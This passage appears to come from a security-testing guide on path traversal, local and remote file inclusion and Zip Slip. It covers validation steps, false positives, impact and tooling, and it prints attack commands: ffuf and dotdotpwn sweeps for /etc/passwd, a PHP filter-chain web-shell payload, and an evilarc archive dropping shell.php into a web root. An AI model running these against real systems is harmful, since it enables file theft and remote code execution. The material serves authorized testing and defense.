5. **Characterize writes** - Determine create/overwrite/append, path and byte control, permissions, and reload/trigger conditions
6. **Map resolvers** - Test template/view search paths, autoloaders, plugins, configs, jobs, and other internal consumers separately from direct file serving
7. **Escalate** - From disclosure (read) to influence (write/extract/include), then to execution through a proven resolver or interpreter

## Validation

1. Show a minimal traversal read proving out-of-root access (e.g., `/etc/hosts`) with a same-endpoint in-root control
2. For LFI, demonstrate inclusion of a benign local file or harmless wrapper output (`php://filter` base64 of index.php)
3. For RFI, prove remote fetch by OAST or controlled output; avoid destructive payloads
4. For Zip Slip, create an archive with `../` entries and show write outside target (e.g., marker file read back)
5. For file-write chains, first prove a canary is created at the intended path, then prove the normal resolver loads it; document cache/reload requirements
6. Provide before/after file paths, exact requests, and content hashes/lengths for reproducibility

## False Positives

- In-app virtual paths that do not map to filesystem; content comes from safe stores (DB/object storage)
- Canonicalized paths constrained to an allowlist/root after normalization
- Wrappers disabled and includes using constant templates only
- Archive extractors that sanitize paths and enforce destination directories

Common shapes that *look like* traversal but are not:
- **Response echoes the payload but not file bytes** — a template that renders the raw `?file=` value into an error message ("File not found: ../../etc/passwd") is a reflected disclosure of the parameter, not a read. Confirm with a canonical-file test that changes the response *body* against a control.
- **Content-length divergence without content change** — a route that returns different `Content-Length` for `../../etc/hosts` vs a valid filename may just be echoing the parameter into a wrapper template of different length. Diff the actual content, not the length.
- **200 with an empty body on both control and traversal** — the endpoint always returns 200 (framework's default renderer), the file simply isn't read; the response is a rendering of "no such file." Look for a `Content-Type`/`Content-Disposition` change or a header naming the file.
- **DNS callback without HTTP** — for RFI targets, `interactsh` shows only a DNS hit and no HTTP fetch: the URL-parser is resolving the hostname, not fetching the URL. Prove the fetch with an HTTP-only URL (`http://<id>.oast.fun/x`) and check for the HTTP hit.
- **`../` normalized to root** — the app calls `realpath` and re-anchors to `/`, but then reads `/` (or hits `EISDIR`) — a stack trace naming `/etc/passwd` in the resolver call proves resolution ran, not that content was returned.
- **In-repository read** — the app serves files from the repo directory; a traversal into `../../src/config.py` succeeds but the file has no secrets — the primitive is real, the impact is low. Note the primitive and score by impact, not by "read succeeded."

## Impact

- Sensitive configuration/source disclosure → credential and key compromise
- Code execution via inclusion of attacker-controlled content or overwritten templates
- Persistence via dropped files in served directories; lateral movement via revealed secrets
- Supply-chain impact when report/template engines execute attacker-influenced files

## Pro Tips

1. Compare content-length/ETag when content is masked; read small canonical files (hosts) to avoid noise
2. Test proxy/CDN and app separately; decoding/normalization order differs, especially for `%2f` and `%2e` encodings
3. For LFI, prefer `php://filter` base64 probes over destructive payloads; enumerate readable logs and sessions
4. Validate extraction code with synthetic archives; include symlinks and deep `../` chains
5. Use minimal PoCs and hard evidence (hashes, paths). Avoid noisy DoS against filesystems
6. When direct execution is blocked, enumerate internal search paths before assuming the write is low impact
7. Fingerprint the sink shape (read / evaluate / import / write / copy / fetch-and-inline) before firing traversal — the shape decides which probes carry real evidence and which are noise
8. For the PHP filter-chain LFI→RCE class, confirm the sink evaluates (`include`/`require`/`eval`) before quoting RCE — a `readfile`/`file_get_contents` sink is disclosure only, no matter how good the chain is
9. Establish identity (`/proc/self/status`) and containment (`/proc/1/cgroup`) with a single request after the first successful traversal; those two files scope the impact chain more tightly than any secondary read

## Tooling

- **ffuf** — parameter and payload fuzzing with response-length/status filtering; the fastest way to sweep a large payload catalog against one parameter:
  ```bash
  ffuf -u 'https://target/view?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -fs 512
  ```
  Use `-fs` to filter the length of the "empty" response, so real reads pop out.
- **dotdotpwn** — traversal-specific fuzzer with encoding/OS variants and a depth walk:
  ```bash
  dotdotpwn -m http -h target -M GET -O -f /etc/passwd -k 'root:'
  ```
- **kadimus** — LFI-specific: enumerates wrappers, tries log poisoning, and generates the /proc/self/environ inject; useful when the sink is confirmed and you want a fast RCE-attempt sweep.
- **php-filter-chain generator** — Synacktiv's canonical LFI→RCE generator for evaluate-sink PHP:
  ```bash
  python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]);?>'
  ```
  Chain length scales ~200× the payload length in the current generator — a URL-length constraint above ~8 KB will cap what you can execute.
- **gopherus** — chain SSRF-to-LFI-to-shell (produces `gopher://` payloads targeting Redis/FCGI/MySQL/…); route to `ssrf.md` when the read primitive is inside an SSRF that reaches `gopher://`.
- **interactsh-client** — OAST callback for RFI confirmation; a DNS hit proves resolution, an HTTP hit proves fetch — use both signals to distinguish the two.
- **zip-slip PoC generators** — for archive-extraction testing, `evilarc` and standalone one-shot Python scripts create archives with `../` and absolute-path entries:
  ```bash
  evilarc -p '../../var/www/html/' -o unix -f shell.jar shell.php
  ```

## Summary

Eliminate user-controlled paths where possible. Otherwise, resolve to canonical paths and enforce allowlists, forbid remote schemes, and lock down interpreters and extractors. Normalize consistently at the boundary closest to IO.
